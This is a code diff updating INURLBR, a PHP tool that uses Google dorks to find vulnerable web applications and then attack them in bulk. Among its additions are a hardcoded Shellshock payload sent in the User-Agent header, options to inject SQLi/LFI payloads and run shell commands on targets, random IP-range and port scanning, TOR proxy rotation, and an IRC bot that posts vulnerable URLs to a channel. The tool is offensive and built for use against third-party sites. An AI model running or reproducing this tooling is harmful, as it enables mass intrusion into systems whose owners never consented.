@@ -2,9 +2,15 @@
 <?php
 /*
 
-  [!] Legal disclaimer: Usage of INURLBR for attacking targets without prior mutual consent is illegal.
-  It is the end user's responsibility to obey all applicable local, state and federal laws.
-  Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  +-----------------------------------------------------------------------------+
+  |  [!] Legal disclaimer: Usage of INURLBR for attacking targets without prior |
+  |  mutual consent is illegal.                                                 |
+  |  It is the end user's responsibility to obey all applicable local, state and|
+  |  federal laws.                                                              |
+  |  Developers assume no liability and are not responsible for any misuse or   |
+  |  damage caused by this program                                              |
+  +-----------------------------------------------------------------------------+
+
 
   [+] AUTOR:        Cleiton Pinheiro / Nick: googleINURL
   [+] Blog:         http://blog.inurl.com.br
@@ -13,17 +19,74 @@
   [+] Pastebin      http://pastebin.com/u/Googleinurl
   [+] GIT:          https://github.com/googleinurl
   [+] PSS:          http://packetstormsecurity.com/user/googleinurl
+  [+] EXA:          http://exploit4arab.net/author/248/Cleiton_Pinheiro
   [+] YOUTUBE:      http://youtube.com/c/INURLBrasil
   [+] PLUS:         http://google.com/+INURLBrasil
 
-  [+] SCRIPT NAME: INURLBR 2.0
+  [+] SCRIPT NAME: INURLBR 2.1
+  INURLBR scanner was developed by Cleiton Pinheiro, owner and founder of INURL - BRASIL.
+  Tool made ​​in PHP that can run on different Linux distributions helps
+  hackers / security professionals in their specific searches.
+  With several options are automated methods of exploration, AND SCANNER is
+  known for its ease of use and performasse.
+  The inspiration to create the inurlbr scanner, was the XROOT Scan 5.2 application.
 
-  [+] Dependencies:
+  [+]  Long desription
+  The INURLBR tool was developed aiming to meet the need of Hacking community.
+  Purpose: Make advanced searches to find potential vulnerabilities in web
+  applications known as Google Hacking with various options and search filters,
+  this tool has an absurd power of search engines available with
+  (24) + 6 engines special(deep web)
+
+  - Possibility generate IP ranges or random_ip and analyze their targets.
+  - Customization of  HTTP-HEADER, USER-AGET, URL-REFERENCE.
+  - Execution external to exploit certain targets.
+  - Generator dorks random or set file dork.
+  - Option to set proxy, file proxy list, http proxy, file http proxy.
+  - Set time random proxy.
+  - It is possible to use TOR ip Random.
+  - Debug processes urls, http request, process irc.
+  - Server communication irc sending vulns urls for chat room.
+  - Possibility injection exploit GET / POST => SQLI, LFI, LFD.
+  - Filter and validation based regular expression.
+  - Extraction of email and url.
+  - Validation using http-code.
+  - Search pages based on strings file.
+  - Exploits commands manager.
+  - Paging limiter on search engines.
+  - Beep sound when trigger vulnerability note.
+  - Use text file as a data source for urls tests.
+  - Find personalized strings in return values of the tests.
+  - Validation vulnerability shellshock.
+  - File validation values wordpress wp-config.php.
+  - Execution sub validation processes.
+  - Validation syntax errors database and programmin.
+  - Data encryption as native parameter.
+  - Random google host.
+  - Scan port.
+  - Error Checking & values​​:
+  [*]JAVA INFINITYDB, [*]LOCAL FILE INCLUSION, [*]ZIMBRA MAIL,           [*]ZEND FRAMEWORK,
+  [*]ERROR MARIADB,   [*]ERROR MYSQL,          [*]ERROR JBOSSWEB,        [*]ERROR MICROSOFT,
+  [*]ERROR ODBC,      [*]ERROR POSTGRESQL,     [*]ERROR JAVA INFINITYDB, [*]ERROR PHP,
+  [*]CMS WORDPRESS,   [*]SHELL WEB,            [*]ERROR JDBC,            [*]ERROR ASP,
+  [*]ERROR ORACLE,    [*]ERROR DB2,            [*]JDBC CFM,              [*]ERROS LUA,
+  [*]ERROR INDEFINITE
+
+  [+] Dependencies - (PHP 5.4.*):
   sudo apt-get install curl libcurl3 libcurl3-dev php5 php5-cli php5-curl
 
 
   [+] Play LIST TUTORIAL:
   https://www.youtube.com/watch?v=jwjZUsgf9xM&list=PLV1376pVwcCmcoCmq_Z4O0ra4BqjmhIaR
+
+
+  +--------------------------------------------------------------------------------------+
+  |  |  |                            G R 3 3 T S                                   |  |  |
+  +--------------------------------------------------------------------------------------+
+ * r00t-3xp10t, Jh00n, chk_,  Unknownantisec,  sl4y3r 0wn3r, hc0d3r, arplhmd, 0x4h4x
+ * Clandestine, KoubackTr, SnakeTomahawk, SkyRedFild, Lorenzo Faletra, Eclipse, shaxer   
+ * dd3str0y3r, Johnny Deep, Lenon Leite, pSico_b0y, Bakunim_Malvadão, IceKiller, c00z  
+ * Oystex, rH, Warflop 
 
  */
 
@@ -36,129 +99,403 @@ ini_set('allow_url_fopen', 1);
 (!isset($_SESSION) ? session_start() : NULL);
 __OS();
 
-//Capturing TERMINAL VALUES.
+
+/*
+  [+]Capturing TERMINAL VALUES.
+  (PHP 4 >= 4.3.0, PHP 5)getopt - Gets options from the command line argument list
+  http://php.net/manual/pt_BR/function.getopt.php */
 $commandos_list = array(
-    'dork:', 'dork-file:', 'tor-random::', 'no-banner::', 'exploit-cad:',
-    'exploit-all-id:', 'exploit-vull-id:', 'exploit-list::', 'exploit-get:', 'exploit-post:',
-    'exploit-command:', 'command-all:', 'command-vul:', 'replace:', 'regexp:', 'regexp-filter:',
-    'sall:', 'sub-file:', 'sub-post::', 'sub-get::', 'user-agent:', 'url-reference:', 'unique::', 'delay:',
-    'time-out:', 'http-header:', 'ifcode:', 'ifurl:', 'cms-check::', 'gc::', 'mp:', 'target:',
-    'proxy:', 'proxy-file:', 'time-proxy:', 'proxy-http-file', 'update::', 'info::', 'help::', 'ajuda::',
-    'install-dependence::', 'sendmail:', 'alexa-rank::', 'beep::'
+    'dork:', 'dork-file:', 'exploit-cad:', 'range:', 'range-rand:', 'irc:',
+    'exploit-all-id:', 'exploit-vul-id:', 'exploit-get:', 'exploit-post:',
+    'regexp-filter:', 'exploit-command:', 'command-all:', 'command-vul:',
+    'replace:', 'remove:', 'regexp:', 'sall:', 'sub-file:', 'sub-get::',
+    'user-agent:', 'url-reference:', 'delay:', 'sendmail:', 'time-out:',
+    'http-header:', 'ifcode:', 'ifurl:', 'ifemail:', 'mp:', 'target:',
+    'no-banner::', 'gc::', 'proxy:', 'proxy-file:', 'time-proxy:', 'pr::',
+    'proxy-http-file:', 'update::', 'info::', 'help::', 'unique::', 'popup::',
+    'ajuda::', 'install-dependence::', 'cms-check::', 'sub-post::', 'robots::',
+    'alexa-rank::', 'beep::', 'exploit-list::', 'tor-random::', 'shellshock::',
+    'dork-rand:', 'sub-cmd-all:', 'sub-cmd-vul:', 'port-cmd:', 'port-scan:',
+    'port-write:', 'ifredirect:', 'persist:', 'file-cookie:', 'save-as:'
 );
 
 $opcoes = getopt('u::a:d:o:p:s:q:t:m::h::', $commandos_list);
 
-//VERIFYING LIB php5-curl IS INSTALLED.
-(!function_exists('curl_exec') ? __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]}INSTALLING THE LIBRARY php5-curl ex: php5-curl apt-get install{$_SESSION["c0"]}\n") : NULL );
-(!defined('STDIN') ? __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]}Please run it through command-line!{$_SESSION["c0"]}\n") : NULL);
+
+/*
+  [+]VERIFYING LIB php5-curl IS INSTALLED.
+  (PHP 4, PHP 5) function_exists — Return TRUE if the given function has been
+  defined.
+  http://php.net/manual/en/function.function-exists.php
+
+  [+]Verification - CURL_EXEC
+  Execute the given cURL session.
+  This function should be called after initializing a cURL session and all the
+  options for the session are set.
+  http://php.net/manual/en/function.curl-exec.php */
+(!function_exists('curl_exec') ? __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]} INSTALLING THE LIBRARY php5-curl ex: php5-curl apt-get install{$_SESSION["c0"]}\n") : NULL );
+
+/*
+  [+]VERIFYING use Input PHP CLI.
+  (PHP 4, PHP 5) defined — Checks whether a given named constant exists
+  http://php.net/manual/pt_BR/function.defined.php */
+(!defined('STDIN') ? __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]} Please run it through command-line!{$_SESSION["c0"]}\n") : NULL);
 
 
-
-//Resetting VALUES $ _SESSION ['config']
+#[+]Resetting VALUES $ _SESSION ['config']
 $_SESSION['config'] = array();
-$_SESSION['config']['version_script'] = '2.0';
+$_SESSION['config']['version_script'] = '2.1';
 $_SESSION['config']['totas_urls'] = NULL;
 $_SESSION['config']["contUrl"] = 0;
 $_SESSION['config']['cont_email'] = 0;
 $_SESSION['config']['cont_url'] = 0;
 $_SESSION['config']['cont_valores'] = 0;
+
+#[+] FILE MANAGEMENT EXPLOITS.
 $_SESSION['config']['file_exploit_conf'] = 'exploits.conf';
+
+#[+] FOLDER WHERE WILL BE SAVED PROCESSES.
 $_SESSION['config']['out_put_paste'] = 'output/';
 
-$_SESSION['config']['blacklist'] = "//t.co,google.,youtube.,jsuol.com,.radio.uol.,b.uol.,barra.uol.,whowhere.,hotbot.,amesville.,lycos,lygo.,orkut.,schema.,blogger.,bing.,w3.,yahoo.,yimg.,creativecommons.org,ndj6p3asftxboa7j.,.torproject.org,.lygo.com,.apache.org,";
+/*
+  [+]USER-AGENT EXPLOIT SHELLSHOCK
+  (CVE-2014-6271, CVE-2014-6277,
+  CVE-2014-6278, CVE-2014-7169,
+  CVE-2014-7186, CVE-2014-7187)
+  is a vulnerability in GNU's bash shell that gives attackers access to run remote
+  commands on a vulnerable system. */
+$_SESSION['config']['user_agent_xpl'] = "() { foo;};echo; /bin/bash -c \"expr 299663299665 / 3; echo CMD:;id; echo END_CMD:;\"";
+
+#[+]BLACK LIST URL-STRINGS
+$_SESSION['config']['blacklist'] = "//t.co,google.,youtube.,jsuol.com,.radio.uol.,b.uol.,barra.uol.,whowhere.,hotbot.,amesville.,lycos,lygo.,orkut.,schema.,blogger.,bing.,w3.,yahoo.,yimg.,creativecommons.org,ndj6p3asftxboa7j.,.torproject.org,.lygo.com,.apache.org,.hostname.,document.,";
 $_SESSION['config']['blacklist'].= "live.,microsoft.,ask.,shifen.com,answers.,analytics.,googleadservices.,sapo.pt,favicon.,blogspot.,wordpress.,.css,scripts.js,jquery-1.,dmoz.,gigablast.,aol.,.macromedia.com,.sitepoint.,yandex.,www.tor2web.org,.securityfocus.com,.Bootstrap.,.metasploit.com,";
 $_SESSION['config']['blacklist'].= "aolcdn.,altavista.,clusty.,teoma.,baiducontent.com,wisenut.,a9.,uolhost.,w3schools.,msn.,baidu.,hao123.,shifen.,procog.,facebook.,twitter.,flickr.,.adobe.com,oficinadanet.,elephantjmjqepsw.,.shodan.io,kbhpodhnfxl3clb4,.scanalert.com,.prototype.,feedback.core,";
-$_SESSION['config']['blacklist'].= "4shared.,.KeyCodeTab,.style.,www/cache/i1,.className.,=n.,a.Ke=,Y.config,.goodsearch.com,style.top,n.Img,n.canvas.,t.search,Y.Search.,a.href,a.currentStyle,a.style,yastatic.,.oth.net,.hotbot.com,.zhongsou.com,ezilon.com,.example.com,location.href,.navigation.,.hostname.,";
-$_SESSION['config']['blacklist'].= ".bingj.com,Y.Mobile.,srpcache?p,stackoverflow.,shifen.,baidu.,baiducontent.,gstatic.,php.net,wikipedia.,webcache.,inurl.,naver.,navercorp.,windows.,window.,.devmedia,imasters.,.inspcloud.com,.lycos.com,.scorecardresearch.com,.target.,JQuery.min,Element.location.,document.,";
-$_SESSION['config']['blacklist'].= "exploit-db,packetstormsecurity.,1337day,owasp,.sun.com,mobile10.dtd,onabort=function,inurl.com.br,purl.org,.dartsearch.net,r.cb,.classList.,.pt_BR.,github,microsofttranslator.com,.compete.com,.sogou.com,gmail.,blackle.com,boorow.com,gravatar.com";
+$_SESSION['config']['blacklist'].= "4shared.,.KeyCodeTab,.style.,www/cache/i1,.className.,=n.,a.Ke=,Y.config,.goodsearch.com,style.top,n.Img,n.canvas.,t.search,Y.Search.,a.href,a.currentStyle,a.style,yastatic.,.oth.net,.hotbot.com,.zhongsou.com,ezilon.com,.example.com,location.href,.navigation.,";
+$_SESSION['config']['blacklist'].= ".bingj.com,Y.Mobile.,srpcache?p,stackoverflow.,shifen.,baidu.,baiducontent.,gstatic.,php.net,wikipedia.,webcache.,inurl.,naver.,navercorp.,windows.,window.,.devmedia,imasters.,.inspcloud.com,.lycos.com,.scorecardresearch.com,.target.,JQuery.min,Element.location.,";
+$_SESSION['config']['blacklist'].= "exploit-db,packetstormsecurity.,1337day,owasp,.sun.com,mobile10.dtd,onabort=function,inurl.com.br,purl.org,.dartsearch.net,r.cb,.classList.,.pt_BR.,github,microsofttranslator.com,.compete.com,.sogou.com,gmail.,blackle.com,boorow.com,gravatar.com,sourceforge.,.mozilla.org";
 
-$_SESSION['config']['line'] = "\n{$_SESSION["c1"]} _[ - ]{$_SESSION["c7"]}::{$_SESSION["c1"]}------------------------------------------------------------------------------------------------------------------{$_SESSION["c0"]}";
+$_SESSION['config']['line'] = "\n{$_SESSION["c1"]} _[ - ]{$_SESSION["c7"]}::{$_SESSION["c1"]}--------------------------------------------------------------------------------------------------------------{$_SESSION["c0"]}";
 
-//PRINTING HELP / INFO
+#[+]PRINTING HELP / INFO
 (isset($opcoes['h']) || isset($opcoes['help']) || isset($opcoes['ajuda']) ? __menu() : NULL);
 (isset($opcoes['info']) ? __info() : NULL);
 
-//PRINTING EXPLOITS LIST.
+#[+]PRINTING EXPLOITS LIST.
 (isset($opcoes['exploit-list']) ? print(__bannerLogo()) . __configExploitsList(1)  : NULL);
 
-//CREATING DEFAULT SETTINGS EXIT RESULTS.
+#[+]CREATING DEFAULT SETTINGS EXIT RESULTS.
 (!is_dir($_SESSION['config']['out_put_paste']) ? mkdir($_SESSION['config']['out_put_paste'], 0777, TRUE) : NULL);
 
-//CREATING DEFAULT SETTINGS MANAGEMENT EXPLOITS.
+#[+]CREATING DEFAULT SETTINGS MANAGEMENT EXPLOITS.
 (!file_exists($_SESSION['config']['file_exploit_conf']) ? touch($_SESSION['config']['file_exploit_conf']) : NULL);
 
-//Deletes FILE cookie STANDARD.
+#[+]Deletes FILE cookie STANDARD.
 (file_exists('cookie.txt') ? unlink('cookie.txt') : NULL);
 
-//REGISTRATION NEW COMMAND EXPLOIT
+#[+]REGISTRATION NEW COMMAND EXPLOIT
 (not_isnull_empty($opcoes['exploit-cad']) ? __configExploitsADD($opcoes['exploit-cad']) : NULL);
 
-//Dependencies installation
+#[+]Dependencies installation
 (isset($opcoes['install-dependence']) ? __installDepencia() : NULL);
 
-//UPDATE SCRIPT
+#[+]UPDATE SCRIPT
 (isset($opcoes['update']) ? __update() : NULL);
 
 ################################################################################
 #CAPTURE OPTIONS################################################################
-
+################################################################################
+#[+]VALIDATION SEARCH METHODS / (DORK,RANGE-IP)
 if (not_isnull_empty($opcoes['o'])) {
 
     $_SESSION['config']['abrir-arquivo'] = $opcoes['o'];
-} else if (!not_isnull_empty($opcoes['o'])) {
+} else if (!not_isnull_empty($opcoes['o']) &&
+        !not_isnull_empty($opcoes['range']) &&
+        !not_isnull_empty($opcoes['range-rand']) &&
+        !not_isnull_empty($opcoes['dork-rand'])) {
 
     $_SESSION['config']['dork'] = not_isnull_empty($opcoes['dork']) && is_null($_SESSION['config']['abrir-arquivo']) ? $opcoes['dork'] : NULL;
     $_SESSION['config']['dork-file'] = not_isnull_empty($opcoes['dork-file']) && is_null($_SESSION['config']['abrir-arquivo']) ? $opcoes['dork-file'] : NULL;
     (!not_isnull_empty($_SESSION['config']['dork']) && !not_isnull_empty($_SESSION['config']['dork-file']) ? __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]}DEFINE DORK ex: --dork '.asp?CategoryID=' OR --dork-file 'dorks.txt'{$_SESSION["c0"]}\n") : NULL);
 }
 
+#[+]VALIDATION GENERATE DORKS RANDOM
+$_SESSION['config']['dork-rand'] = not_isnull_empty($opcoes['dork-rand']) ? $opcoes['dork-rand'] : NULL;
+
+#[+]VALIDATION TARGET FIND PAGE
 $_SESSION['config']['target'] = not_isnull_empty($opcoes['target']) && !isset($_SESSION['config']['dork']) ? $opcoes['target'] : NULL;
-$_SESSION['config']['extrai-url'] = isset($opcoes['u']) && empty($opcoes['o']) ? TRUE : NULL;
-$_SESSION['config']['extrai-email'] = isset($opcoes['m']) && empty($opcoes['o']) ? TRUE : NULL;
-$_SESSION['config']['motor'] = not_isnull_empty($opcoes['q']) && __validateOptions('1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,e1,e2,e3,e4,e5,e6,all', $opcoes['q']) ? $opcoes['q'] : 1;
-$_SESSION['config']['arquivo_output'] = not_isnull_empty($opcoes['s']) || !empty($opcoes['sall']) ? $opcoes['s'] : __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]}DEFINE FILE SAVE OUTPUT ex: -s filevull.txt{$_SESSION["c0"]}\n");
+
+#[+]VALIDATION URL EXTRACTION
+$_SESSION['config']['extrai-url'] = isset($opcoes['u']) ? TRUE : NULL;
+
+#[+]VALIDATION EMAIL EXTRACTION
+$_SESSION['config']['extrai-email'] = isset($opcoes['m']) ? TRUE : NULL;
+
+#[+]VALIDATION ID SEARCH ENGINE
+$_SESSION['config']['motor'] = not_isnull_empty($opcoes['q']) &&
+        __validateOptions('1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,e1,e2,e3,e4,e5,e6,all', $opcoes['q']) ? $opcoes['q'] : 1;
+
+#[+]VALIDATION SAVE FILE VULNERABLE
+!not_isnull_empty($opcoes['s']) && !not_isnull_empty($opcoes['save-as']) && empty($opcoes['sall']) ?
+                __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]}DEFINE FILE SAVE OUTPUT ex: -s , --save-as , --sall filevull.txt{$_SESSION["c0"]}\n") : NULL;
+
+$_SESSION['config']['s'] = not_isnull_empty($opcoes['s']) ? $opcoes['s'] : null;
+
+$_SESSION['config']['save-as'] = not_isnull_empty($opcoes['save-as']) ? $opcoes['save-as'] : null;
+
+$_SESSION['config']['arquivo_output'] = not_isnull_empty($_SESSION['config']['s']) ? $_SESSION['config']['s'] : $opcoes['save-as'];
+
+#[+]VALIDATION SAVE FILE ALL VALORES
 $_SESSION['config']['arquivo_output_all'] = not_isnull_empty($opcoes['sall']) ? $opcoes['sall'] : NULL;
+
+#[+]VALIDATION TYPE ERROR
 $_SESSION['config']['tipoerro'] = not_isnull_empty($opcoes['t']) && __validateOptions('1,2,3,4,5', $opcoes['t']) ? $opcoes['t'] : 1;
+
+#[+]VALIDATION REPLACEMENT VALUES
 $_SESSION['config']['replace'] = not_isnull_empty($opcoes['replace']) ? $opcoes['replace'] : NULL;
+
+#[+]VALIDATION SET PROXY
 $_SESSION['config']['proxy'] = not_isnull_empty($opcoes['proxy']) ? $opcoes['proxy'] : NULL;
+
+#[+]VALIDATION SET FILE WITH LIST OF PROXY
 $_SESSION['config']['proxy-file'] = not_isnull_empty($opcoes['proxy-file']) ? $opcoes['proxy-file'] : NULL;
+
+#[+]VALIDATION SET HTTP->PROXY
 $_SESSION['config']['proxy-http'] = not_isnull_empty($opcoes['proxy-http']) ? $opcoes['proxy-http'] : NULL;
+
+#[+]VALIDATION SET FILE WITH LIST OF HTTP->PROXY
 $_SESSION['config']['proxy-http-file'] = not_isnull_empty($opcoes['proxy-http-file']) ? $opcoes['proxy-http-file'] : NULL;
-$_SESSION['config']['exploit-get'] = not_isnull_empty($opcoes['exploit-get']) ? $opcoes['exploit-get'] : NULL;
+
+#[+]VALIDATION SET EXPLOIT VIA REQUEST GET
+$_SESSION['config']['exploit-get'] = not_isnull_empty($opcoes['exploit-get']) ? str_replace(' ', '%20', $opcoes['exploit-get']) : NULL;
+
+#[+]VALIDATION SET EXPLOIT VIA REQUEST POST
 $_SESSION['config']['exploit-post'] = not_isnull_empty($opcoes['exploit-post']) ? __convertUrlQuery($opcoes['exploit-post']) : NULL;
+$_SESSION['config']['exploit-post_str'] = not_isnull_empty($opcoes['exploit-post']) ? $opcoes['exploit-post'] : NULL;
+
+#[+]VALIDATION COMMAND SHELL STRING COMPLEMENTARY
 $_SESSION['config']['exploit-command'] = not_isnull_empty($opcoes['exploit-command']) ? $opcoes['exploit-command'] : NULL;
-$_SESSION['config']['exploit-vull-id'] = not_isnull_empty($opcoes['exploit-vull-id']) ? $opcoes['exploit-vull-id'] : NULL;
+
+#[+]VALIDATION MANAGEMENT COMMANDS SHELL TARGET VULN ID
+$_SESSION['config']['exploit-vul-id'] = not_isnull_empty($opcoes['exploit-vul-id']) ? $opcoes['exploit-vul-id'] : NULL;
+
+#[+]VALIDATION MANAGEMENT COMMANDS SHELL ALL TARGET ID
 $_SESSION['config']['exploit-all-id'] = not_isnull_empty($opcoes['exploit-all-id']) ? $opcoes['exploit-all-id'] : NULL;
+
+#[+]VALIDATION SET COMMANDS SHELL EXECUTE TARGET VULN
 $_SESSION['config']['command-vul'] = not_isnull_empty($opcoes['command-vul']) ? $opcoes['command-vul'] : NULL;
+
+#[+]VALIDATION SET COMMANDS SHELL EXECUTE ALL TARGET
 $_SESSION['config']['command-all'] = not_isnull_empty($opcoes['command-all']) ? $opcoes['command-all'] : NULL;
+
+#[+]VALIDATION ADDITIONAL TYPE OF PARAMETER ERROR
 $_SESSION['config']['achar'] = not_isnull_empty($opcoes['a']) ? $opcoes['a'] : NULL;
-$_SESSION['config']['debug'] = not_isnull_empty($opcoes['d']) && __validateOptions('1,2,3,4,5', $opcoes['d']) ? $opcoes['d'] : NULL;
+
+#[+]VALIDATION DEBUG NIVEL
+$_SESSION['config']['debug'] = not_isnull_empty($opcoes['d']) && __validateOptions('1,2,3,4,5,6', $opcoes['d']) ? $opcoes['d'] : NULL;
+
+#[+]VALIDATION INTERNAL
 $_SESSION['config']['verifica_info'] = (__validateOptions($opcoes['d'], 6)) ? 1 : NULL;
+
+#[+]VALIDATION ADDITIONAL PARAMETER PROXY
 $_SESSION['config']['tor-random'] = isset($opcoes['tor-random']) && !is_null($_SESSION["config"]["proxy"]) ? TRUE : NULL;
+
+#[+]VALIDATION CHECK VALUES CMS
 $_SESSION['config']['cms-check'] = isset($opcoes['cms-check']) ? TRUE : NULL;
+
+#[+]VALIDATION CHECK LINKS WEBCACHE GOOGLE
 $_SESSION['config']['webcache'] = isset($opcoes['gc']) ? TRUE : NULL;
+
+#[+]VALIDATION REGULAR EXPRESSION
 $_SESSION['config']['regexp'] = not_isnull_empty($opcoes['regexp']) ? $opcoes['regexp'] : NULL;
+
+#[+]VALIDATION FILTER BY REGULAR EXPRESSION
 $_SESSION['config']['regexp-filter'] = not_isnull_empty($opcoes['regexp-filter']) ? $opcoes['regexp-filter'] : NULL;
+
+#[+]VALIDATION NO BANNER SCRIPT
 $_SESSION['config']['no-banner'] = isset($opcoes['no-banner']) ? TRUE : NULL;
+
+#[+]VALIDATION SET USER-AGENT REQUEST
 $_SESSION['config']['user-agent'] = not_isnull_empty($opcoes['user-agent']) ? $opcoes['user-agent'] : NULL;
+
+#[+]VALIDATION SET URL-REFERENCE REQUEST
 $_SESSION['config']['url-reference'] = not_isnull_empty($opcoes['url-reference']) ? $opcoes['url-reference'] : NULL;
+
+#[+]VALIDATION PAGING THE MAXIMUM SEARCH ENGINE
 $_SESSION['config']['max_pag'] = not_isnull_empty($opcoes['mp']) ? $opcoes['mp'] : NULL;
+
+#[+]VALIDATION DELAY SET PAGING AND PROCESSES
 $_SESSION['config']['delay'] = not_isnull_empty($opcoes['delay']) ? $opcoes['delay'] : NULL;
+
+#[+]VALIDATION SET TIME OUT REQUEST
 $_SESSION['config']['time-out'] = not_isnull_empty($opcoes['time-out']) ? $opcoes['time-out'] : NULL;
+
+#[+]VALIDATION CODE HTTP
 $_SESSION['config']['ifcode'] = not_isnull_empty($opcoes['ifcode']) ? $opcoes['ifcode'] : NULL;
+
+#[+]VALIDATION STRING URL
 $_SESSION['config']['ifurl'] = not_isnull_empty($opcoes['ifurl']) ? $opcoes['ifurl'] : NULL;
+
+#[+]VALIDATION SET HTTP HEADER
 $_SESSION['config']['http-header'] = not_isnull_empty($opcoes['http-header']) ? $opcoes['http-header'] : NULL;
+
+#[+]VALIDATION SET FILE SUB_PROCESS
 $_SESSION['config']['sub-file'] = not_isnull_empty($opcoes['sub-file']) ? __openFile($opcoes['sub-file'], 1) : NULL;
+
+#[+]VALIDATION SUB_PROCESS TYPE REQUEST POST
 $_SESSION['config']['sub-post'] = isset($opcoes['sub-post']) ? TRUE : NULL;
+
+#[+]VALIDATION SUB_PROCESS TYPE REQUEST GET
 $_SESSION['config']['sub-get'] = isset($opcoes['sub-get']) ? TRUE : NULL;
+
+#[+]VALIDATION SEND VULN EMAIL
 $_SESSION['config']['sendmail'] = not_isnull_empty($opcoes['sendmail']) ? $opcoes['sendmail'] : NULL;
+
+#[+]VALIDATION SHOW RANK ALEXA
 $_SESSION['config']['alexa-rank'] = isset($opcoes['alexa-rank']) ? TRUE : NULL;
+
+#[+]VALIDATION ACTIVATE BEEP WHEN APPEAR VULNERABLE
 $_SESSION['config']['beep'] = isset($opcoes['beep']) ? TRUE : NULL;
+
+#[+]VALIDATION OF SINGLE DOMAIN FILTER 
 $_SESSION['config']['unique'] = isset($opcoes['unique']) ? TRUE : NULL;
 
+#[+]VALIDATION IRC SERVER/CHANNEL SEND VULN
+$_SESSION['config']['irc']['conf'] = not_isnull_empty($opcoes['irc']) && strstr($opcoes['irc'], '#') ? explode("#", $opcoes['irc']) : NULL;
+
+#[+]VALIDATION RANGE IP
+$_SESSION['config']['range'] = not_isnull_empty($opcoes['range']) && strstr($opcoes['range'], ',') ? $opcoes['range'] : NULL;
+
+#[+]VALIDATION QUANTITY RANGE IP RANDOM
+$_SESSION['config']['range-rand'] = not_isnull_empty($opcoes['range-rand']) ? $opcoes['range-rand'] : NULL;
+
+#[+]VALIDATION REMOVE STRING URL
+$_SESSION['config']['remove'] = not_isnull_empty($opcoes['remove']) ? $opcoes['remove'] : NULL;
+
+#[+]VALIDATION ACCESS FILE ROBOTS
+$_SESSION['config']['robots'] = isset($opcoes['robots']) ? TRUE : NULL;
+
+#[+]VALIDATION FILTER EMAIL STRING
+$_SESSION['config']['ifemail'] = not_isnull_empty($opcoes['ifemail']) ? $opcoes['ifemail'] : NULL;
+
+#[+]VALIDATION OPEN WINDOW CONSOLE PROCESS
+$_SESSION['config']['popup'] = isset($opcoes['popup']) ? TRUE : NULL;
+
+#[+]VALIDATION ACTIVATE SHELLSHOCK
+$_SESSION['config']['shellshock'] = isset($opcoes['shellshock']) ? TRUE : NULL;
+
+#[+]VALIDATION METHOD OF BUSTA PROGRESSIVE
+$_SESSION['config']['pr'] = isset($opcoes['pr']) ? TRUE : NULL;
+
+#[+]VALIDATION SET SUB-COMMANDS SHELL EXECUTE ALL TARGET
+$_SESSION['config']['sub-cmd-all'] = isset($opcoes['sub-cmd-all']) ? TRUE : NULL;
+
+#[+]VALIDATION SET SUB-COMMANDS SHELL EXECUTE TARGET VULN
+$_SESSION['config']['sub-cmd-vul'] = isset($opcoes['sub-cmd-vul']) ? TRUE : NULL;
+
+#[+]VALIDATION SET POR VALIDATION
+$_SESSION['config']['port-cmd'] = not_isnull_empty($opcoes['port-cmd']) ? $opcoes['port-cmd'] : NULL;
+
+#[+]VALIDATION SET SCAN PORT
+$_SESSION['config']['port-scan'] = not_isnull_empty($opcoes['port-scan']) ? $opcoes['port-scan'] : NULL;
+
+#[+]VALIDATION SET PAYLOAD XPL PORT
+$_SESSION['config']['port-write'] = not_isnull_empty($opcoes['port-write']) ? $opcoes['port-write'] : NULL;
+
+#[+]VALIDATION SET URL REDIRECT HEADER
+$_SESSION['config']['ifredirect'] = not_isnull_empty($opcoes['ifredirect']) ? $opcoes['ifredirect'] : NULL;
+
+#[+]VALIDATION SET URL REDIRECT HEADER
+$_SESSION['config']['persist'] = not_isnull_empty($opcoes['persist']) ? $opcoes['persist'] : 4;
+
+#[+]VALIDATION SET FILE COOKIE
+$_SESSION['config']['file-cookie'] = not_isnull_empty($opcoes['file-cookie']) ? $opcoes['file-cookie'] : NULL;
+
 ################################################################################
+#IRC CONFIGURATION##############################################################
+################################################################################
+
+if (is_array($_SESSION['config']['irc']['conf'])) {
+
+    $alph = range("A", "Z");
+    $_ = array(0 => rand(0, 10000), 1 => $alph[rand(0, count($alph))]);
+    $_SESSION['config']['irc']['my_pid'] = 0;
+    $_SESSION['config']['irc']['irc_server'] = $_SESSION['config']['irc']['conf'][0];
+    $_SESSION['config']['irc']['irc_channel'] = "#{$_SESSION['config']['irc']['conf'][1]}";
+    $_SESSION['config']['irc']['irc_port'] = 6667;
+    $_SESSION['config']['irc']['localhost'] = "127.0.0.1 localhost";
+    $_SESSION['config']['irc']['irc_nick'] = "[BOT]1nurl{$_[0]}[{$_[1]}]";
+    $_SESSION['config']['irc']['irc_realname'] = "B0t_1NURLBR";
+    $_SESSION['config']['irc']['irc_quiet'] = "Session Ended";
+    global $conf;
+} elseif (!is_array($_SESSION['config']['irc']['conf']) && not_isnull_empty($opcoes['irc'])) {
+
+    __getOut(__bannerLogo() . "{$_SESSION["c1"]}[ INFO ]{$_SESSION["c0"]}{$_SESSION["c2"]}IRC WRONG FORMAT! ex: --irc 'irc.rizon.net#inurlbrasil' {$_SESSION["c0"]}\n");
+}
+
+################################################################################
+#IRC CONECTION##################################################################
+################################################################################
+
+function __ircConect($conf) {
+
+    $fp = fsockopen($conf['irc_server'], $conf['irc_port'], $conf['errno'], $conf['errstr'], 30);
+    if (!$fp) {
+
+        echo "Error: {$conf['errstr']}({$conf['errno']})\n";
+        return NULL;
+    }
+    $u = php_uname();
+    fwrite($fp, "NICK {$conf['irc_nick']}\r\n");
+    fwrite($fp, "USER {$conf['irc_nick']} 8 * :{$conf['irc_realname']}\r\n");
